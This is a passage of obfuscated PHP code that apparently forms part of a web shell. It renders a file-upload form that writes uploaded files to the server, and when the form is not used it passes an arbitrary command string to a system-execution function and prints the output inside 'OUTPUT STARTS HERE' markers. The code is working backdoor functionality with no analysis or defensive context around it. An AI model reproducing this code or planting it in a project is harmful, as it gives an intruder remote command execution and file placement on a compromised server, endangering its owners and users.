'<td><input type=submit name=_act value="Upload!"></td></tr>'; print '</table></form><hr><hr>'; $sp93f2fd = str_replace('\\"', '"', $sp93f2fd); $sp93f2fd = str_replace('\\\\\'', '\\\'', $sp93f2fd); if (isset($_POST['_act']) && $_POST['_act'] == 'Upload!') { if ($_FILES['_upl']['error'] != UPLOAD_ERR_OK) { print '<center><b>Error while uploading file!</b></center>'; } else { print '<center><pre>'; if (!@move_uploaded_file($_FILES['_upl']['tmp_name'], $spf13d6a . '/' . $_FILES['_upl']['name'])) { $spb3b003 = system_custom('mv ' . $_FILES['_upl']['tmp_name'] . ' ' . $spf13d6a . '/' . $_FILES['_upl']['name'] . ' 2>&1'); } echo $spb3b003; print '</pre><b>File uploaded successfully!</b></center>'; } } else { print '

<!-- OUTPUT STARTS HERE -->
<pre>
'; $sp93f2fd = 'cd ' . $spf13d6a . ';' . $sp93f2fd; $spb3b003 = system_custom($sp93f2fd); echo $spb3b003; print '
</pre>
<!-- OUTPUT ENDS HERE -->

</center><hr><hr><center><b>Command completed</b></center>'; } die; echo '[syslog]05
';